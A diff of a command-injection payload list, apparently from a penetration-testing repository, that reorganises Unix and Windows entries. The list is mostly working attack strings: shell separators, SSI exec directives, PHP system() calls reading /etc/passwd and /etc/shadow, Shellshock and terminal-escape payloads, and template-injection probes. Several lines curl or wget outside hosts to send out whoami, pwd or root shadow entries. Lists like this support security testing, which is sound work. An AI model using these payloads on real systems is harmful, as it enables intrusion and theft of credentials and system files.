@@ -39,6 +39,7 @@ If it is considered unavoidable to incorporate user-supplied data into operating
 ;id;
 ;id
 ;netstat -a;
+;system('cat%20/etc/passwd')
 ;id;
 |id
 |/usr/bin/id
@@ -101,38 +102,6 @@ a|/usr/bin/id
 %0a id %0a
 `id`
 $;/usr/bin/id
-```
-
-### Windows :
-
-```
-`
-|| 
-| 
-; 
-'
-'"
-"
-"'
-& 
-&& 
-%0a
-%0a%0d
-%0Acat%20/etc/passwd
-%0Aid
-%0a id %0a
-%0Aid%0A
-%0a ping -i 30 127.0.0.1 %0a
-%0A/usr/bin/id
-%0A/usr/bin/id%0A
-%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
-%20{${phpinfo()}}
-%20{${sleep(20)}}
-%20{${sleep(3)}}
-a|id|
-a;id|
-a;id;
-a;id\n
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
@@ -157,6 +126,45 @@ a;id\n
 cat /etc/hosts
 $(`cat /etc/passwd`)
 cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+```
+
+### Windows :
+
+```
+`
+|| 
+| 
+; 
+'
+'"
+"
+"'
+& 
+&& 
+%0a
+%0a%0d
+
+%0Aid
+%0a id %0a
+%0Aid%0A
+%0a ping -i 30 127.0.0.1 %0a
+%0A/usr/bin/id
+%0A/usr/bin/id%0A
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+%20{${phpinfo()}}
+%20{${sleep(20)}}
+%20{${sleep(3)}}
+a|id|
+a;id|
+a;id;
+a;id\n
 () { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
 | curl http://crowdshield.com/.testing/rce.txt
 & curl http://crowdshield.com/.testing/rce.txt
@@ -289,9 +297,6 @@ ls -l /tmp
 & ls -l /var/www/*
 && ls -l /var/www/*
 ls -l /var/www/*
-<!--#exec cmd="/bin/cat /etc/passwd"-->
-<!--#exec cmd="/bin/cat /etc/shadow"-->
-<!--#exec cmd="/usr/bin/id;-->
 \n
 \n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
 \n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
@@ -373,7 +378,6 @@ perl -e 'print "X"x81920'
 && phpinfo()
 phpinfo()
 phpinfo();
-<?php system("cat /etc/passwd");?>
 <?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
 <?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
 <?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
@@ -434,10 +438,8 @@ sysinfo
 ; sysinfo
 & sysinfo
 && sysinfo
-;system('cat%20/etc/passwd')
 system('cat C:\boot.ini');
 system('cat config.php');
-system('cat /etc/passwd');
 || system('curl https://crowdshield.com/.testing/rce_vuln.txt');
 | system('curl https://crowdshield.com/.testing/rce_vuln.txt');
 ; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
@@ -546,7 +548,6 @@ $(`whoami`)
 && whoami
 {{ get_user_file("C:\boot.ini") }}
 {{ get_user_file("/etc/hosts") }}
-{{ get_user_file("/etc/passwd") }}
 {{4+4}}
 {{4+8}}
 {{person.secret}}
